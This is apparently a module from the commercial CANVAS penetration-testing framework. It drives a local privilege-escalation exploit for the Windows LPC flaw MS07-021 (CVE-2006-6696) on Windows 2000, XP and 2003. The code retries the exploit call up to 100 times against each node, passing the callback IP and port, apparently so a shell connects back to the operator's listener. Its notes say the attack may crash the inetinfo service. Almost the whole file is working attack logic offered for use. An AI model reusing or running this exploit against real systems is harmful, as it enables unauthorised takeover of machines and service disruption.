#! /usr/bin/env python



#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2004
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
sys.path.append(".")
sys.path.append("../../")
sys.path.append('../../encoder')
sys.path.append('./encoder')
sys.path.append("../../shellcode")
sys.path.append("./shellcode")
sys.path.append("../../gui")
sys.path.append("./gui")


import os,getopt
import socket
from exploitutils import *
import addencoder
import win32shell
from canvasexploit import canvasexploit
import canvasengine

from canvasengine import socket_save_list
from ExploitTypes.localexploit import LocalExploit

import time
import shellcodeGenerator

import ntstatus

NAME="LPC local (MS07-021)"
DESCRIPTION="Local LPC privilege escalation [ Windows 2000 / XP / 2003 ]"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION["Notes"]="""
If you get FFFFFFF that means inetinfo died (sorry), STATUS_PORT_CONNECTION_REFUSED is normal. Just keep trying.
Also note that this will try 100 times, you might want to use the halt functionality to stop it
There's a very small chance this exploit will cause a box to pop up for inetinfo
So run it from a spawned listener you don't mind using.
Don't use this on a node spawned from inetinfo, or the node will die when inetinfo crashes
"""
DOCUMENTATION["CVE Name"] = "CVE-2006-6696"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-6696"
DOCUMENTATION['CVSS'] = 6.9


#QO44056 fixes this?
VERSION="1.0"
GTK2_DIALOG="dialog.glade2"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Local"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2000", "XP", "2003" ]
PROPERTY['MSADV']="MS07-021"

runAnExploit_gtk2=canvasengine.runAnExploit_gtk2
runExploit=canvasengine.runExploit


class theexploit(LocalExploit):
    def __init__(self):
        LocalExploit.__init__(self)
        self.result = ""
        self.name   = NAME

    def neededListenerTypes(self): 
        return [canvasengine.WIN32MOSDEF]

    def run(self):
        self.callback.argsDict["fromcreatethread"] = 0

        self.setInfo("%s (in progress)"%(NAME))
        for node in self.argsDict["passednodes"]:            
            type=node.nodetype
            count = 100
            maxcount=count
            #get process name to ensure we don't run inside inetinfo or dllhost.exe
            app=self.engine.getModuleExploit("getprocessname")
            app.link(self)
            app.argsDict["passednodes"]=[node]
            app.run()

           
            try:
                pname=app.result[0].lower()
            except IndexError:
                self.log("This node is not supported for the LPC attack.")
                self.setInfo("%s - done (failed)"%(NAME))
                return 0
                
            if pname.count("inetinfo") or pname.count("dllhost"):
                self.log("We cannot run when within dllhost or inetinfo. Continuing to next node.")
                continue
            
            self.log("You can use the halt function if you want to stop it")
            if "win32api" in node.capabilities:
                ret=self.ISucceeded()
                while not ret and count != 0:
                    self.setProgress(float(maxcount-count+1)/float(maxcount)*100)
                    self.log("Running localExploitLPC...")
                    self.result=node.shell.localExploitLPC({ "ipaddress" : self.callback.ip, "port" : self.callback.port })
                    #self.log("Result: %s"%self.result)
                    # do ntstatus

                    if self.result:
                        try:
                            print "NTSTATUS RESPONSE: %s"%ntstatus.reverseNTS[uint32(self.result)]
                        except:
                            print "NTSTATUS %.8X NOT FOUND"%uint32(self.result)
                    count -= 1
                    print "Try countdown # %d"%count
                    # give inetinfo some time to recover and restart
                    sleeptime=10
                    print "sleeping %d seconds"%sleeptime
                    time.sleep(sleeptime)
                    if self.state==self.HALT:
                        count=0
                    self.log("Checking to see if I succeeded")
                    ret=self.ISucceeded()
                    self.log("Success=%s"%ret)

            else:
                self.log("Node of type %s not supported yet."%type)
                pass
         
        if self.ISucceeded():
            self.setInfo("%s - done (success)"%(NAME))
            ret=1
        else:
            self.setInfo("%s - done (failed)"%(NAME))
            ret=0
        return ret

    

